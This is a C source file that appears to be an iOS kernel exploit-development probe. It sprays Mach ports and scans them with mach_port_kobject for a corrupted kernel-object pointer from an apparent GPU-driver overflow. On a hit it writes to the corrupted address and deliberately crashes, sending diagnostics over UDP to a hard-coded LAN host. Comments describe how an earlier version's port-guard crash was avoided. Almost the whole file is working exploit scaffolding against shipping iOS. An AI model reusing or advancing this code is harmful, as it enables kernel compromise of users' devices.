/*
 * AllocatorProbe v8 — Diagnostic + Kobject-first Commpage Trigger
 * ================================================================
 * v7 post-mortem: task_info on corrupted ports triggers EXC_GUARD (iOS 26.x
 * port guard mechanism fires before kernel can dereference ip_kobject).
 *
 * v8 strategy:
 *   1. mach_port_kobject scan: log EVERY result via UDP (kotype, kobject, kr)
 *      BEFORE any crash attempt — diagnostic pass reveals actual overflow pattern.
 *   2. commpage_hit check relaxed: check kobject==COMMPAGE_TARGET regardless
 *      of kotype. If kr==KERN_SUCCESS and kobject==COMMPAGE_TARGET, write to
 *      kobject → user-space EXC_BAD_ACCESS, FAR=COMMPAGE_TARGET.
 *   3. NO task_info calls (avoids EXC_GUARD).
 *   4. Fallback: generic crash (blr 0xBEEFDEAD) after full scan.
 *
 * Expected IPS (if overflow hits correctly):
 *   Exception: EXC_BAD_ACCESS, FAR=0x0000000FFFFFC330
 *   Stack: scan_ports → timer_cb → CFRunLoop → main
 *
 * Diagnostic: all kotype/kobject/kr values sent to NEXUS_UDP_HOST:9999 in real-time.
 */

#include <mach/mach.h>
#include <mach/task.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define NEXUS_UDP_HOST   "192.168.68.122"
#define NEXUS_UDP_PORT   9999

#define NUM_PORTS        5000
#define SCAN_INTERVAL    0.05
#define IKOT_TASK        2
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

static mach_port_t g_ports[NUM_PORTS];
static int         g_count = 0;
static int         g_found = 0;
static int         g_udp_sock = -1;

static void udp_send(const char *buf, int len) {
    if (g_udp_sock < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port   = htons(NEXUS_UDP_PORT);
    inet_aton(NEXUS_UDP_HOST, &a.sin_addr);
    sendto(g_udp_sock, buf, (size_t)len, 0, (struct sockaddr *)&a, sizeof(a));
}

static void log_msg(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    udp_send(buf, n);
    write(STDERR_FILENO, buf, n);
}

static void scan_ports(void) {
    if (g_found) return;

    int first_bad_idx = -1;
    kern_return_t first_bad_kr = 0;
    natural_t first_bad_kotype = 0;
    mach_vm_address_t first_bad_kobject = 0;

    for (int i = 0; i < g_count; i++) {
        natural_t         kotype  = 0;
        mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                              &kotype, &kobject);

        /* Log any result that deviates from normal (normal = kr==0, kotype==1, kobject==0) */
        int normal = (kr == KERN_SUCCESS && (kotype == 1 || kotype == 0) && kobject == 0);
        if (!normal) {
            log_msg("PORT[%d]: kr=%d kotype=%u kobject=0x%016llx\n",
                    i, kr, kotype, (unsigned long long)kobject);
        }

        /* Primary: kobject==COMMPAGE_TARGET (any kotype that kr succeeded) */
        if (kr == KERN_SUCCESS && kobject == COMMPAGE_TARGET) {
            g_found = 1;
            log_msg("=== COMMPAGE_HIT: port=%d kotype=%u kobject=0x%016llx ===\n"
                    "AGX ip_kobject write PROVEN. Triggering write to COMMPAGE_TARGET.\n",
                    i, kotype, (unsigned long long)kobject);
            /* Write to COMMPAGE_TARGET → EXC_BAD_ACCESS, FAR=0x0000000FFFFFC330 */
            volatile uint64_t *ptr = (volatile uint64_t *)kobject;
            *ptr = 0xBEEFDEAD00FACADE;
            __builtin_trap();
        }

        /* Exact IKOT_TASK match (in case iOS 26.x returns it) */
        if (kr == KERN_SUCCESS && kotype == IKOT_TASK && kobject != 0) {
            g_found = 1;
            log_msg("=== IKOT_TASK_HIT: port=%d kobject=0x%016llx ===\n", i, (unsigned long long)kobject);
            volatile uint64_t *ptr = (volatile uint64_t *)kobject;
            *ptr = 0xBEEFDEAD00FACADE;
            __builtin_trap();
        }

        /* Track first corruption for fallback */
        if (kr != KERN_SUCCESS || kotype > 100 || kotype == 0) {
            if (first_bad_idx < 0) {
                first_bad_idx    = i;
                first_bad_kr     = kr;
                first_bad_kotype = kotype;
                first_bad_kobject = kobject;
            }
        }
    }

    /* Fallback: generic crash after full scan */
    if (first_bad_idx >= 0) {
        g_found = 1;
        log_msg("GENERIC_FALLBACK: port=%d kr=%d kotype=%u kobject=0x%016llx\n"
                "No commpage hit — crashing with 0xBEEFDEAD\n",
                first_bad_idx, first_bad_kr, first_bad_kotype,
                (unsigned long long)first_bad_kobject);
        __asm__ volatile(
            "mov x0, #0xDEAD\n"
            "movk x0, #0xBEEF, lsl #16\n"
            "blr x0\n"
        );
    }
}

typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static int g_tick = 0;

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    g_tick++;
    if (g_tick == 1) {
        g_udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
        mach_port_t task = mach_task_self();
        for (int i = 0; i < NUM_PORTS; i++) {
            mach_port_t p = MACH_PORT_NULL;
            if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
            if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND)
                    != KERN_SUCCESS) {
                mach_port_deallocate(task, p); break;
            }
            g_ports[g_count++] = p;
        }
        log_msg("READY ports=%d tick=1 scanning@50ms target=0x0000000FFFFFC330\n", g_count);
    } else if (g_count > 0) {
        scan_ports();
        if (g_tick % 200 == 0) {
            log_msg("ALIVE tick=%d found=%d\n", g_tick, g_found);
        }
    }
}

int main(void) {
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0,
        CFAbsoluteTimeGetCurrent() + 0.3,
        SCAN_INTERVAL,
        0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
